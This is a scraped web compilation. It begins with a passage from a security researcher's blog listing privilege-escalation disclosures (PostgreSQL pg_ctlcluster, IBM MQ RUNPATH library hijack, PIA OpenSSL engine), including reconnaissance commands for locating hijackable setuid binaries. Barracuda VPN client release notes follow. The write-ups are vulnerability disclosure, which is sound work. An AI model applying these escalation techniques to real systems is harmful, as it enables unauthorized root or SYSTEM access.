* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from campus.barracuda.com_e56b723f_20250121_011311.html ===


![](//collector-PXr4kpL2v6.perimeterx.net/api/v1/collector/noScript.gif?appId=PXr4kpL2v6)

![Log into Barracuda Campus](https://campus.barracuda.com/resources/img/logo_white.svg)

Login

Log in with your email address and your Barracuda Campus, Barracuda Cloud Control, or Barracuda Partner Portal password.

Next

[Don't have an account?](https://campus.barracuda.com/register/)

 Your data is transferred using secure TLS connections.

#### Confirm

No
Yes

It seems like your browser didn't download the required fonts. Please [revise your security settings](/faq/fontproblem) and try again.

[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)

Ireland – English (GMT+0)](https://campus.barracuda.com/settings)
 [Contact & Support](#support)

[![Barracuda Campus](https://campus.barracuda.com/resources/img/logo.svg)
![Barracuda Campus](https://campus.barracuda.com/resources/img/logo_square.svg)](https://campus.barracuda.com/)

[Product](#productcollapser)

[Portal](#portalcollapser)

[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ5L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLWxpbnV4Lw%3D%3D/)

[Login](https://campus.barracuda.com/logon)
[Sign Up](https://campus.barracuda.com/register/)
 [Contact & Support](https://campus.barracuda.com/support)
[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)Ireland – English (GMT+0)](https://campus.barracuda.com/settings)

* Email Protection
* Application & Cloud Security
* Network Security
* Data Protection
* XDR
* Barracuda MSP
* Others

Network Security
Email Protection
Application & Cloud Security
Network Security
Data Protection
XDR
Barracuda MSP
Others

[Email Protection](https://campus.barracuda.com/product/emailprotection/ "Email Protection")

[Total Email Protection](https://campus.barracuda.com/product/totalemailprotection/ "Barracuda Total Email Protection")

[Email Gateway Defense (Email Security)](https://campus.barracuda.com/product/emailgatewaydefense/ "Email Gateway Defense")

[Impersonation Protection (Sentinel)](https://campus.barracuda.com/product/sentinel/ "Impersonation Protection")

[Cloud Archiving Service](https://campus.barracuda.com/product/cloudarchiving/ "Barracuda Cloud Archiving Service")

[Security Awareness Training (PhishLine)](https://campus.barracuda.com/product/phishline/ "Security Awareness Training")

[Email Security Gateway](https://campus.barracuda.com/product/emailsecuritygateway/ "Barracuda Email Security Gateway")

[Domain Fraud Protection](https://campus.barracuda.com/product/domainfraudprotection/ "Barracuda Domain Fraud Protection")

[Incident Response](https://campus.barracuda.com/product/forensics/ "Incident Response")

[Message Archiver](https://campus.barracuda.com/product/messagearchiver/ "Barracuda Message Archiver")

[WAF-as-a-Service](https://campus.barracuda.com/product/WAAS/ "Barracuda WAF-as-a-Service")

[Web Application Firewall](https://campus.barracuda.com/product/webapplicationfirewall/ "Barracuda Web Application Firewall")

[Cloud Security Guardian](https://campus.barracuda.com/product/cloudsecurityguardian/ "Barracuda Cloud Security Guardian")

[Load Balancer ADC](https://campus.barracuda.com/product/loadbalanceradc/ "Barracuda Load Balancer ADC")

[Vulnerability Manager](https://campus.barracuda.com/product/vulnerabilitymanager/ "Barracuda Vulnerability Manager")

[Vulnerability Remediation Service](https://campus.barracuda.com/product/vulnerabilityremediationservice/ "Barracuda Vulnerability Remediation Service")

[WAF Control Center](https://campus.barracuda.com/product/wcc/ "Barracuda WAF Control Center")

[Active DDoS Prevention](https://campus.barracuda.com/product/ddosprevention/ "Barracuda Active DDoS Prevention")

[CloudGen Firewall](https://campus.barracuda.com/product/cloudgenfirewall/ "Barracuda CloudGen Firewall")

[SecureEdge](https://campus.barracuda.com/product/secureedge/ "Barracuda SecureEdge")

[CloudGen Access](https://campus.barracuda.com/product/cloudgenaccess/ "Barracuda CloudGen Access")

[Network Access Client](https://campus.barracuda.com/product/networkaccessclient/ "Barracuda Network Access Client")

[Firewall Insights](https://campus.barracuda.com/product/firewallinsights/ "Barracuda Firewall Insights")

[Web Security Gateway](https://campus.barracuda.com/product/websecuritygateway/ "Barracuda Web Security Gateway")

[Content Shield](https://campus.barracuda.com/product/ContentShield/ "Barracuda Content Shield")

[Web Security Agent](https://campus.barracuda.com/product/websecurityagent/ "Barracuda Web Security Agent")

[Firewall Policy Manager](https://campus.barracuda.com/product/firewallpolicymanager/ "Barracuda Firewall Policy Manager")

[Data Inspector](https://campus.barracuda.com/product/datainspector/ "Barracuda Data Inspector")

[Cloud-to-Cloud Backup](https://campus.barracuda.com/product/cloudtocloudbackup/ "Barracuda Cloud-to-Cloud Backup")

[Backup](https://campus.barracuda.com/product/backup/ "Barracuda Backup")

[XDR](https://campus.barracuda.com/product/xdr/ "Barracuda XDR")

[RMM (Managed Workplace)](https://campus.barracuda.com/product/managedworkplace/ "Barracuda RMM")

[Managed Security Awareness Training (Managed Phishline)](https://campus.barracuda.com/product/phishlinemsp/ "Managed Security Awareness Training")

[Intronis Backup (ECHOplatform)](https://campus.barracuda.com/product/echoplatform/ "Barracuda Intronis Backup")

[MSP App](https://campus.barracuda.com/product/MSPPM/ "MSP App")

[MSP Knowledge Base](https://campus.barracuda.com/product/ISBKB/ "MSP Knowledge Base")

[Site Security Scanner](https://campus.barracuda.com/product/sitesecurityscanner/ "Barracuda Site Security Scanner")

[MSP – Partner Enablement](https://campus.barracuda.com/product/partnerenablementmsp/ "MSP – Partner Enablement")

[Link Balancer](https://campus.barracuda.com/product/linkbalancer/ "Barracuda Link Balancer")

[Essentials](https://campus.barracuda.com/product/essentials/ "Barracuda Essentials")

[Load Balancer](https://campus.barracuda.com/product/loadbalancer/ "Barracuda Load Balancer")

[ArchiveOne](https://campus.barracuda.com/product/archiveone/ "Barracuda ArchiveOne")

[PST Enterprise](https://campus.barracuda.com/product/pstenterprise/ "Barracuda PST Enterprise")

[Server Backup (Yosemite)](https://campus.barracuda.com/product/yosemite/ "Yosemite Server Backup")

[Cloud Control](https://campus.barracuda.com/product/cloudcontrol/ "Barracuda Cloud Control")

[Control Server](https://campus.barracuda.com/product/controlserver/ "Barracuda Control Server")

[Campus Help Center / Reference](https://campus.barracuda.com/product/campus/ "Campus Help Center / Reference")

[Onboarding Portal](https://campus.barracuda.com/product/onboarding/ "Onboarding Portal")

[Network Security](https://campus.barracuda.com/product/networksecurity/ "Network Security")

[Support Services](https://campus.barracuda.com/product/SUP/ "Support Services")

Barracuda Network Access Client

 [Overview](https://campus.barracuda.com/product/networkaccessclient/)
 [Documentation](https://campus.barracuda.com/product/networkaccessclient/articles/)
 [Training](https://campus.barracuda.com/product/networkaccessclient/courses/)
 [Materials](https://campus.barracuda.com/product/networkaccessclient/downloads/)

[![Barracuda Campus](https://campus.barracuda.com/resources/img/logo.svg)
![Barracuda Campus](https://campus.barracuda.com/resources/img/logo_square.svg)](https://campus.barracuda.com/)

 [Product](#product-collapser-search-fixed-nav)

 [Portal](#portal-collapser-search-fixed-nav)

[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ5L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLWxpbnV4Lw%3D%3D/)

* Email Protection
* Application & Cloud Security
* Network Security
* Data Protection
* XDR
* Barracuda MSP
* Others

Network Security
Email Protection
Application & Cloud Security
Network Security
Data Protection
XDR
Barracuda MSP
Others

[Email Protection](https://campus.barracuda.com/product/emailprotection/ "Email Protection")

[Total Email Protection](https://campus.barracuda.com/product/totalemailprotection/ "Barracuda Total Email Protection")

[Email Gateway Defense (Email Security)](https://campus.barracuda.com/product/emailgatewaydefense/ "Email Gateway Defense")

[Impersonation Protection (Sentinel)](https://campus.barracuda.com/product/sentinel/ "Impersonation Protection")

[Cloud Archiving Service](https://campus.barracuda.com/product/cloudarchiving/ "Barracuda Cloud Archiving Service")

[Security Awareness Training (PhishLine)](https://campus.barracuda.com/product/phishline/ "Security Awareness Training")

[Email Security Gateway](https://campus.barracuda.com/product/emailsecuritygateway/ "Barracuda Email Security Gateway")

[Domain Fraud Protection](https://campus.barracuda.com/product/domainfraudprotection/ "Barracuda Domain Fraud Protection")

[Incident Response](https://campus.barracuda.com/product/forensics/ "Incident Response")

[Message Archiver](https://campus.barracuda.com/product/messagearchiver/ "Barracuda Message Archiver")

[WAF-as-a-Service](https://campus.barracuda.com/product/WAAS/ "Barracuda WAF-as-a-Service")

[Web Application Firewall](https://campus.barracuda.com/product/webapplicationfirewall/ "Barracuda Web Application Firewall")

[Cloud Security Guardian](https://campus.barracuda.com/product/cloudsecurityguardian/ "Barracuda Cloud Security Guardian")

[Load Balancer ADC](https://campus.barracuda.com/product/loadbalanceradc/ "Barracuda Load Balancer ADC")

[Vulnerability Manager](https://campus.barracuda.com/product/vulnerabilitymanager/ "Barracuda Vulnerability Manager")

[Vulnerability Remediation Service](https://campus.barracuda.com/product/vulnerabilityremediationservice/ "Barracuda Vulnerability Remediation Service")

[WAF Control Center](https://campus.barracuda.com/product/wcc/ "Barracuda WAF Control Center")

[Active DDoS Prevention](https://campus.barracuda.com/product/ddosprevention/ "Barracuda Active DDoS Prevention")

[CloudGen Firewall](https://campus.barracuda.com/product/cloudgenfirewall/ "Barracuda CloudGen Firewall")

[SecureEdge](https://campus.barracuda.com/product/secureedge/ "Barracuda SecureEdge")

[CloudGen Access](https://campus.barracuda.com/product/cloudgenaccess/ "Barracuda CloudGen Access")

[Network Access Client](https://campus.barracuda.com/product/networkaccessclient/ "Barracuda Network Access Client")

[Firewall Insights](https://campus.barracuda.com/product/firewallinsights/ "Barracuda Firewall Insights")

[Web Security Gateway](https://campus.barracuda.com/product/websecuritygateway/ "Barracuda Web Security Gateway")

[Content Shield](https://campus.barracuda.com/product/ContentShield/ "Barracuda Content Shield")

[Web Security Agent](https://campus.barracuda.com/product/websecurityagent/ "Barracuda Web Security Agent")

[Firewall Policy Manager](https://campus.barracuda.com/product/firewallpolicymanager/ "Barracuda Firewall Policy Manager")

[Data Inspector](https://campus.barracuda.com/product/datainspector/ "Barracuda Data Inspector")

[Cloud-to-Cloud Backup](https://campus.barracuda.com/product/cloudtocloudbackup/ "Barracuda Cloud-to-Cloud Backup")

[Backup](https://campus.barracuda.com/product/backup/ "Barracuda Backup")

[XDR](https://campus.barracuda.com/product/xdr/ "Barracuda XDR")

[RMM (Managed Workplace)](https://campus.barracuda.com/product/managedworkplace/ "Barracuda RMM")

[Managed Security Awareness Training (Managed Phishline)](https://campus.barracuda.com/product/phishlinemsp/ "Managed Security Awareness Training")

[Intronis Backup (ECHOplatform)](https://campus.barracuda.com/product/echoplatform/ "Barracuda Intronis Backup")

[MSP App](https://campus.barracuda.com/product/MSPPM/ "MSP App")

[MSP Knowledge Base](https://campus.barracuda.com/product/ISBKB/ "MSP Knowledge Base")

[Site Security Scanner](https://campus.barracuda.com/product/sitesecurityscanner/ "Barracuda Site Security Scanner")

[MSP – Partner Enablement](https://campus.barracuda.com/product/partnerenablementmsp/ "MSP – Partner Enablement")

[Link Balancer](https://campus.barracuda.com/product/linkbalancer/ "Barracuda Link Balancer")

[Essentials](https://campus.barracuda.com/product/essentials/ "Barracuda Essentials")

[Load Balancer](https://campus.barracuda.com/product/loadbalancer/ "Barracuda Load Balancer")

[ArchiveOne](https://campus.barracuda.com/product/archiveone/ "Barracuda ArchiveOne")

[PST Enterprise](https://campus.barracuda.com/product/pstenterprise/ "Barracuda PST Enterprise")

[Server Backup (Yosemite)](https://campus.barracuda.com/product/yosemite/ "Yosemite Server Backup")

[Cloud Control](https://campus.barracuda.com/product/cloudcontrol/ "Barracuda Cloud Control")

[Control Server](https://campus.barracuda.com/product/controlserver/ "Barracuda Control Server")

[Campus Help Center / Reference](https://campus.barracuda.com/product/campus/ "Campus Help Center / Reference")

[Onboarding Portal](https://campus.barracuda.com/product/onboarding/ "Onboarding Portal")

[Network Security](https://campus.barracuda.com/product/networksecurity/ "Network Security")

[Support Services](https://campus.barracuda.com/product/SUP/ "Support Services")

[Login](https://campus.barracuda.com/logon)
[Sign Up](https://campus.barracuda.com/register/)
 [Contact & Support](https://campus.barracuda.com/support)
[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)Ireland – English (GMT+0)](https://campus.barracuda.com/settings)

#### Share This Page

Share this page with your network.

 [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcampus.barracuda.com%2Fproduct%2Fnetworkaccessclient%2Fdoc%2F78154149%2Frelease-notes-barracuda-vpn-client-for-linux%2F "Facebook")

 [LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fcampus.barracuda.com%2Fproduct%2Fnetworkaccessclient%2Fdoc%2F78154149%2Frelease-notes-barracuda-vpn-client-for-linux%2F&summary=Barracuda+Network+Access+Client%3A+Release+Notes+-+Barracuda+VPN+Client+for+Linux "LinkedIn")

 Email

Cancel

#### Copy Text

Press `ctrl + c` (or `cmd + c` on a Mac) to copy the below text.

Cancel

#### Unpublish revision

0 articles selected
0 articles locked!

Are you sure you want to unpublish?

Options

Republish immediately

Submit
Cancel

#### Permalink

This is a permanent link to this article. Copy the link below for further reference.

Permalink

Close

#### Confirm

No
Yes

Index

[Release Notes](/product/networkaccessclient/doc/168104058/release-notes/)  [Overview](/product/networkaccessclient/doc/168099842/overview/)

# Release Notes - Barracuda VPN Client for Linux

* Last updated on 2024-11-28 14:15:51

This section contains the release notes for the Barracuda Network Access Client for Linux.

#### Version 5.3.6

* The compatibility with Linux distributions that didn't have the 'ip' command in the standard path have been improved.
  [BNNGF-94874, BNNGF-94840, BNNGF-94839, BNNGF-94768, BNNGF-94576, BNNGF-94768, BNNGF-94841, BNNGF-94866, BNNGF-94907, BNNGF-94910}
* The window with the Linux VPN Client menu no longer freezes on re-opening it before prior closing it. [BNNGF-94732]
* The **Connection Status** window now opens as expected. [BNNGF-94733]
* Misaligned IPv6 route constructions have been fixed. [BNNGF-94837]
* IPv6 routes are correctly displayed if they are present. [BNNGF-94838]
* Improvements have been made regarding the timeout parameter for server connection. [BNNGF-94957]
* The **Update Client** menu option was removed and the GUI was updated. [BNNGF-95251]
* The visual output for the command `barracudavpn --help` has been improved, and the `--config` option now displays the correct text. [BNNGF-95842]

#### Version 5.3.5

* A vulnerability has been resolved that prevents attackers from creating files at unauthorized directory locations. [BNNGF-72677]
* Operating 2 tunnels with AES256-MD5 now works as expected. [BNNGF-82355]
* The VPN client displays the connection status **Successfully connected** correctly while the tunnel is operating. [BNNGF-82983]
* Barracuda VPN no longer suppresses verbose output in output redirections. [BNNGF-89299]
* To ensure that only valid OS versions are allowed to connect via VPN, sending minimum client version information has been enforced. [BNNGF-94280]
* For the case that a certain Linux distribution experiences issues with Barracuda VPN, the logging for the 'ip' command has been improved to ease finding possible causes. [BNNGF-94340]
* Barracuda VPN handles passwords as expected in outputs when run with the option 'verbose'. [BNNGF-94341]
* SIGINT signals are now processed as expected. [BNNGF-94345]
* Barracuda VPN now handles permissions correctly when writing to a certain configuration file. [BNNGF-94346]
* The Barracuda VPN client has been improved in various aspects. [BNNGF-94597]
* When the connection is closed by the VPN server, the VPN client releases all allocated resources as expected. [BNNGF-94651]
* After interrogating the status or the version of the Linux VPN clients, all allocated resources are released as expected. [BNNGF-94652]
* When a client cannot connect to the VPN server, the allocated resources are released as expected. [BNNGF-94669]

#### Version 5.2.2

* Support for multi-factor authentication has been added. [BNNGF-65180]
* VPN Client no longer loses DNS server/search domain. [BNNGF-65955]
* A new config option for disabling automatic VPN reconnect attempts has been added. [BNNGF-57988]
* A vulnerability regarding missing memory corruption mitigation has been fixed. [BNNGF-60786]

#### Version 5.1.4

* Updates for better usability and stability.

#### Version 5.0.2.7

* Fix of a moderate security vulnerability (CVE-2019-6724) where under certain circumstances a local privilege escalation attack was possible. [BNNGF-57654]

#### Version 5.0.2.5

* The Barracuda Network Access Client for Linux now offers more granular logging.
* The Barracuda Network Access Client for Linux now supports Fast Reconnect [BNNGF-55415]
* The Barracuda Network Access Client for Linux now correctly recognizes changed name server settings without having to be restarted.
* The installation package for BSD now follows the proper naming convention to support installation via `pkg-add`.

#### Version 5.0.2

* Barracuda Network Access Client version 5.0.2 is the direct successor to Barracuda Network Access Client version 5.0 and contains all improvements and features delivered with version 5.0.
* Updating to Barracuda Network Access Client 5.0 is possible for any prior version.

##### What´s New with Barracuda VPN Client for Linux Version 5.0.2

* Exclusive Network Access (ENA) support now also available for the Linux VPN Client [BNNGF-51631]
* Linux VPN client calculated new ID on reconnect which led to re-establishing all client sessions. [BNNGF-52318]
* Usage of rtnetlink and deprecated route command works now as expected. [BNNGF-54719]

#### Version 5.0

* Barracuda Network Access Client version 5.0 is the direct successor to Barracuda Network Access Client version 4.3 and contains all improvements and features delivered with version 4.3.
* Updating to Barracuda Network Access Client 5.0 is possible for any prior version.

##### What´s New with Barracuda VPN Client for Linux Version 5.0

* Consolidation of multiple host configuration has been implemented. [BNNGF-52516]

##### Parser Errors

##### In This Article

* [Version 5.3.6](#_3889bb7e)
* [Version 5.3.5](#_e1aff873)
* [Version 5.2.2](#_6353676c)
* [Version 5.1.4](#_58eb8874)
* [Version 5.0.2.7](#_dc0d12a7)
* [Version 5.0.2.5](#_b23690ae)
* [Version 5.0.2](#_6d0ad66f)
* [Version 5.0](#_0446e78d)

**Sorry, failed to get the translation, please try again!**

Show translation (Beta)

![](/resources/img/logos/translated_by_google_logo.svg)

##### Additional Resources

* [Glossary](https://campus.barracuda.com/product/networkaccessclient/glossary/)

##### More

Font Size
Small
Medium (default)
Large
Extra Large

Print
Share Page
 [Permalink](https://campus.barracuda.com/doc/168104062/ "Show permanent link for this article")

#####

[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ5L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLWxpbnV4LyNhZGRpdGlvbmFsLWZlZWRiYWNr/)

##### Do you have further questions, remarks or suggestions?

![Barracuda Logo](/resources/img/logo_barracuda_primary_reversed.svg)

[Contact Us](https://campus.barracuda.com/contact/) | [Privacy Policy](https://www.barracuda.com/company/legal/trust-center/data-privacy/privacy-policy) | [Terms & Conditions](https://www.barracuda.com/company/legal/prd_trm) | [Careers](https://www.barracuda.com/company/careers)  | [Campus Help Center](https://campus.barracuda.com/to/help) | [Courses](https://campus.barracuda.com/courses/) | [Training Centers](https://campus.barracuda.com/trainingcenters/)

© 2003 - 2025 [Barracuda Networks](https://www.barracuda.com/), Inc. All rights reserved.

Cookie Preferences

###### Site Map

* [Courses](https://campus.barracuda.com/courses/)
* [Materials](https://campus.barracuda.com/downloadcenter/)
* [Videos](https://campus.barracuda.com/videos/)
* [Glossary](https://campus.barracuda.com/glossary/)
* [Training Centers](https://campus.barracuda.com/trainingcenters/)
* [Campus Help Center](https://campus.barracuda.com/to/help)

###### Resources

* [Barracuda Networks](https://www.barracuda.com/)
* [Customer Login](https://login.barracuda.com/)
* [Partner Portal](https://partners.barracuda.com/login?ref=new_portal)
* [Community Forum](https://www.barracuda.com/join-community)
* [System Status](http://status.barracuda.com/)
* [Corporate Blog](https://blog.barracuda.com/)

###### Contact Us

* [**Contact Form**](https://campus.barracuda.com/contact/)
* **campus@barracuda.com**
* **+1 408 342 5400 / 888 268 4772**
* General: info@barracuda.com
* Sales: sales@barracuda.com
* Support: support@barracuda.com
* [Read More](https://www.barracuda.com/company/contact/)

[Contact Us](https://campus.barracuda.com/contact/) | [Privacy Policy](https://www.barracuda.com/company/legal/trust-center/data-privacy/privacy-policy) | [Terms & Conditions](https://www.barracuda.com/company/legal/prd_trm) | [Careers](https://www.barracuda.com/company/careers) | [Campus Help Center](https://campus.barracuda.com/to/help) | [Courses](https://campus.barracuda.com/courses/) | [Training Centers](https://campus.barracuda.com/trainingcenters/)
Cookie Preferences

© 2003 - 2025 [Barracuda Networks](https://www.barracuda.com/), Inc. All rights reserved.



=== Content from campus.barracuda.com_8c5c91b3_20250121_011307.html ===


![](//collector-PXr4kpL2v6.perimeterx.net/api/v1/collector/noScript.gif?appId=PXr4kpL2v6)

![Log into Barracuda Campus](https://campus.barracuda.com/resources/img/logo_white.svg)

Login

Log in with your email address and your Barracuda Campus, Barracuda Cloud Control, or Barracuda Partner Portal password.

Next

[Don't have an account?](https://campus.barracuda.com/register/)

 Your data is transferred using secure TLS connections.

#### Confirm

No
Yes

It seems like your browser didn't download the required fonts. Please [revise your security settings](/faq/fontproblem) and try again.

[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)

Ireland – English (GMT+0)](https://campus.barracuda.com/settings)
 [Contact & Support](#support)

[![Barracuda Campus](https://campus.barracuda.com/resources/img/logo.svg)
![Barracuda Campus](https://campus.barracuda.com/resources/img/logo_square.svg)](https://campus.barracuda.com/)

[Product](#productcollapser)

[Portal](#portalcollapser)

